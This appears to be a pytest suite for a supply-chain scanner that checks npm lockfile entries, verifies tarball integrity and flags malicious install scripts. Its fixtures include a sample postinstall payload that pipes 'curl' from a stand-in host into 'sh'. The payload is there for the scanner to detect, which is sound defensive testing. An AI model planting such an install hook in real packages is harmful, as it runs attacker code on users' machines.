import base64
import hashlib
import io
import json
import tarfile

import pytest

from buckthorn import lock
from buckthorn.cli import main
from buckthorn.findings import verdict

REGISTRY = "https://registry.npmjs.org"
RUNS_AT_INSTALL = {"scripts": {"postinstall": "node setup.js"}}
STEALER = "require('child_process').execSync('curl -s https://x.example/a | sh')\n"


def _tgz(manifest: dict, files: dict[str, str] | None = None) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        members = {"package/package.json": json.dumps(manifest)}
        members |= {f"package/{k}": v for k, v in (files or {}).items()}
        for name, text in members.items():
            data = text.encode()
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def _integrity(data: bytes) -> str:
    return "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()


class FakeNpm:
    """Serves tarballs by URL and counts calls."""

    def __init__(self):
        self.files: dict[str, bytes] = {}
        self.calls: list[str] = []

    def add(self, name: str, version: str, extra: dict | None = None, files=None) -> dict:
        data = _tgz({"name": name, "version": version, **(extra or {})}, files)
        base = name.split("/")[-1]
        url = f"{REGISTRY}/{name}/-/{base}-{version}.tgz"
        self.files[url] = data
        return {"version": version, "resolved": url, "integrity": _integrity(data)}

    def __call__(self, url: str, max_bytes: int) -> bytes:
        self.calls.append(url)
        if url in self.files:
            return self.files[url]
        raise lock.FetchError(f"404 {url}")


@pytest.fixture
def npm():
    return FakeNpm()


def _lockfile(tmp_path, packages: dict, version: int = 3, name: str = "package-lock.json"):
    path = tmp_path / name
    data = {"name": "app", "version": "1.0.0", "lockfileVersion": version}
    data["packages"] = {"": {"name": "app", "version": "1.0.0"}} | packages
    path.write_text(json.dumps(data))
    return path


def _summary(results):
    return sorted((r.path, verdict(r.findings)) for r in results)


def test_each_registry_package_is_fetched_checked_and_scanned(tmp_path, npm):
    packages = {
        "node_modules/left-pad": npm.add("left-pad", "1.3.0"),
        "node_modules/@ctrl/tinycolor": npm.add(
            "@ctrl/tinycolor", "4.1.1", RUNS_AT_INSTALL, {"setup.js": STEALER}
        ),
    }
    results = lock.check(_lockfile(tmp_path, packages), fetch=npm)
    assert _summary(results) == [
        ("@ctrl/tinycolor-4.1.1.tgz", "flagged"),
        ("left-pad-1.3.0.tgz", "clean"),
    ]
    assert all(r.sha256 and len(r.sha256) == 64 for r in results)


def test_shrinkwrap_and_lockfile_version_2_are_read(tmp_path, npm):
    packages = {"node_modules/left-pad": npm.add("left-pad", "1.3.0")}
    path = _lockfile(tmp_path, packages, version=2, name="npm-shrinkwrap.json")
    assert _summary(lock.check(path, fetch=npm)) == [("left-pad-1.3.0.tgz", "clean")]


def test_tampered_tarball_is_not_read(tmp_path, npm):
    entry = npm.add("left-pad", "1.3.0")
    npm.files[entry["resolved"]] = _tgz({"name": "left-pad"}, {"x.js": STEALER})
    [result] = lock.check(_lockfile(tmp_path, {"node_modules/left-pad": entry}), fetch=npm)
    assert [(f.rule_id, f.severity.value) for f in result.findings] == [("BKT-LOCK-001", "high")]


@pytest.mark.parametrize(
    "change",
    [
        {"resolved": "https://evil.example/left-pad/-/left-pad-1.3.0.tgz"},
        {"resolved": "http://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz"},
        {"resolved": "git+ssh://git@github.com/x/left-pad.git#abc"},
        {"resolved": "file:../left-pad"},
        {"resolved": None, "integrity": None},
        {"integrity": None},
        {"integrity": "sha1-AAAAAAAAAAAAAAAAAAAAAAAAAAA="},
        {"integrity": "sha512-not base64!"},
        {"resolved": f"{REGISTRY}/left-pad/-/..%2F..%2Fx.tgz"},
    ],
    ids=[
        "other-host",
        "http",
        "git",
        "file",
        "no-resolved-no-integrity",
        "no-integrity",
        "sha1-only",
        "bad-base64",
        "odd-file-name",
    ],
)
def test_what_cannot_be_checked_is_not_verified_and_not_fetched(tmp_path, npm, change):
    entry = npm.add("left-pad", "1.3.0") | change
    entry = {k: v for k, v in entry.items() if v is not None}
    [result] = lock.check(_lockfile(tmp_path, {"node_modules/left-pad": entry}), fetch=npm)
    assert verdict(result.findings) == "not_verified"
    assert npm.calls == []


def test_no_resolved_url_is_fetched_from_the_registry_and_checked(tmp_path, npm):
    """npm's omit-lockfile-registry-resolved leaves the URL out; integrity still pins it."""
    entry = npm.add("@ctrl/tinycolor", "4.1.1")
    del entry["resolved"]
    path = _lockfile(tmp_path, {"node_modules/@ctrl/tinycolor": entry})
    assert _summary(lock.check(path, fetch=npm)) == [("@ctrl/tinycolor-4.1.1.tgz", "clean")]
    assert npm.calls == [f"{REGISTRY}/@ctrl/tinycolor/-/tinycolor-4.1.1.tgz"]


def test_root_and_workspace_links_are_skipped(tmp_path, npm):
    packages = {
        "packages/web": {"name": "web", "version": "1.0.0"},
        "node_modules/web": {"resolved": "packages/web", "link": True},
    }
    assert lock.check(_lockfile(tmp_path, packages), fetch=npm) == []


def test_bundled_package_is_skipped_only_when_its_parent_tarball_holds_it(tmp_path, npm):
    bundled = {"node_modules/b/package.json": '{"name": "b", "version": "1.0.0"}'}
    packages = {
        "node_modules/a": npm.add("a", "1.0.0", {"bundleDependencies": ["b"]}, bundled),
        "node_modules/a/node_modules/b": {"version": "1.0.0", "inBundle": True},
    }
    assert _summary(lock.check(_lockfile(tmp_path, packages), fetch=npm)) == [
        ("a-1.0.0.tgz", "clean")
    ]


@pytest.mark.parametrize("flag", ["inBundle", "inBundled"])
def test_a_bundle_flag_the_parent_does_not_back_is_not_trusted(tmp_path, npm, flag):
    """npm works out bundling from the parent's tarball, never from a lockfile flag."""
    evil = npm.add("evil", "1.0.0", RUNS_AT_INSTALL, {"setup.js": STEALER}) | {flag: True}
    packages = {
        "node_modules/a": npm.add("a", "1.0.0"),
        "node_modules/a/node_modules/evil": evil,
        "node_modules/a/node_modules/b": {"version": "1.0.0", flag: True},
    }
    results = lock.check(_lockfile(tmp_path, packages), fetch=npm)
    assert _summary(results) == [
        ("a-1.0.0.tgz", "clean"),
        ("b==1.0.0", "not_verified"),
        ("evil-1.0.0.tgz", "flagged"),
    ]


def test_a_skipped_decoy_with_the_same_integrity_does_not_hide_a_package(tmp_path, npm):
    evil = npm.add("evil", "1.0.0", RUNS_AT_INSTALL, {"setup.js": STEALER})
    decoy = dict(evil) | {"optional": True, "os": ["no-such-os"]}
    packages = {"node_modules/a/node_modules/evil": decoy, "node_modules/evil": evil}
    results = lock.check(_lockfile(tmp_path, packages), fetch=npm)
    assert ("evil-1.0.0.tgz", "flagged") in _summary(results)


def test_a_lockfile_with_an_mcp_key_is_still_read_as_a_lockfile(tmp_path, npm, monkeypatch):
    entry = npm.add("evil", "1.0.0", RUNS_AT_INSTALL, {"setup.js": STEALER})
    path = _lockfile(tmp_path, {"node_modules/evil": entry})
    data = json.loads(path.read_text()) | {"mcpServers": {}}
    path.write_text(json.dumps(data))
    monkeypatch.setattr(lock, "fetch_url", npm)
    assert main(["check", str(path)]) == 1


def test_lockfile_version_1_is_not_verified(tmp_path, npm):
    path = tmp_path / "package-lock.json"
    path.write_text(json.dumps({"lockfileVersion": 1, "dependencies": {"x": {"version": "1"}}}))
    [result] = lock.check(path, fetch=npm)
    assert verdict(result.findings) == "not_verified"


def test_alias_is_named_for_the_real_package(tmp_path, npm):
    entry = npm.add("left-pad", "1.3.0") | {"name": "left-pad"}
    results = lock.check(_lockfile(tmp_path, {"node_modules/pad": entry}), fetch=npm)
    assert _summary(results) == [("left-pad-1.3.0.tgz", "clean")]


@pytest.mark.parametrize(
    ("key", "change"),
    [
        ("node_modules/@good/tool", {}),
        ("node_modules/x", {"name": "@good/tool"}),
        ("node_modules/@evil/x", {"version": "1.0.0"}),
        ("node_modules/x", {"name": "x==1.0.0"}),
    ],
    ids=["other-key", "other-name", "other-version", "equals-in-name"],
)
def test_an_entry_that_names_another_package_than_its_url_is_not_trusted(
    tmp_path, npm, key, change
):
    """An allowlist matches by name and version, so both come from what is fetched."""
    entry = npm.add("@evil/x", "6.6.6", RUNS_AT_INSTALL, {"setup.js": STEALER}) | change
    [result] = lock.check(_lockfile(tmp_path, {key: entry}), fetch=npm)
    assert verdict(result.findings) == "not_verified"
    assert npm.calls == []


def test_the_same_tarball_at_two_paths_is_fetched_once(tmp_path, npm):
    entry = npm.add("left-pad", "1.3.0")
    packages = {"node_modules/left-pad": entry, "node_modules/a/node_modules/left-pad": entry}
    assert len(lock.check(_lockfile(tmp_path, packages), fetch=npm)) == 1
    assert len(npm.calls) == 1


def test_optional_package_for_another_platform_is_skipped_unless_all_files(tmp_path, npm):
    entry = npm.add("@x/no-such-os", "1.0.0") | {"optional": True, "os": ["no-such-os"]}
    path = _lockfile(tmp_path, {"node_modules/@x/no-such-os": entry})
    [skipped] = lock.check(path, fetch=npm)
    assert [f.rule_id for f in skipped.findings] == ["BKT-LOCK-003"]
    assert npm.calls == []
    assert _summary(lock.check(path, fetch=npm, all_files=True)) == [
        ("@x/no-such-os-1.0.0.tgz", "clean")
    ]


@pytest.mark.parametrize(
    ("field", "allowed"),
    [([], True), (["!no-such-os"], True), (["no-such-os"], False), (["!{here}"], False)],
)
def test_platform_field_follows_npm(field, allowed):
    here = lock._npm_platform()[0]
    assert lock._npm_allows([v.format(here=here) for v in field], here) is allowed


def test_fetch_refuses_hosts_outside_pypi_and_npm():
    with pytest.raises(lock.FetchError):
        lock.fetch_url("https://evil.example/x.tgz", 10)


def test_cli_check_fails_on_a_flagged_package_and_allowlist_keeps_the_scope(
    tmp_path, npm, monkeypatch
):
    entry = npm.add("@ctrl/tinycolor", "4.1.1", RUNS_AT_INSTALL, {"setup.js": STEALER})
    path = _lockfile(tmp_path, {"node_modules/@ctrl/tinycolor": entry})
    monkeypatch.setattr(lock, "fetch_url", npm)
    assert main(["check", str(path)]) == 1
    allow = tmp_path / "allow.json"
    assert main(["check", str(path), "--write-allowlist", str(allow)]) == 0
    entries = json.loads(allow.read_text())["allow"]
    assert {e["package"] for e in entries} == {"@ctrl/tinycolor"}
    assert main(["check", str(path), "--allowlist", str(allow)]) == 0
    unscoped = npm.add("tinycolor", "4.1.1", RUNS_AT_INSTALL, {"setup.js": STEALER})
    (tmp_path / "other").mkdir()
    other = _lockfile(tmp_path / "other", {"node_modules/tinycolor": unscoped})
    assert main(["check", str(other), "--allowlist", str(allow)]) == 1
